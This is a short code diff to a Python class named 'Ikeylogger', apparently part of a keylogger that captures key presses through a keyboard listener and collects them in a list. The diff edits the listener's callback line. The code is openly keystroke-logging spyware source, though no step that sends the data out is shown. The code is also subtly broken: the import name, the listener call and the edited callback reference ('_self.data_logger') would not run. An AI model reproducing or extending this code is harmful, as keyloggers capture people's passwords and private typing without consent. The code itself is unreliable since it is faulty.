@@ -4,7 +4,7 @@ from pynut import keyboard
 
 class Ikeylogger(ABC):
     def __init__(self):
-        self.listener=keyboard.listener(on_press=_data_logger)
+        self.listener=keyboard.listener(on_press=_self.data_logger)
         self.data=[]
 
     def _data_logger(self,key):
@@ -18,6 +18,7 @@ class Ikeylogger(ABC):
 
     def get_logged_keys(self):
         return self.data
+
 
 
 
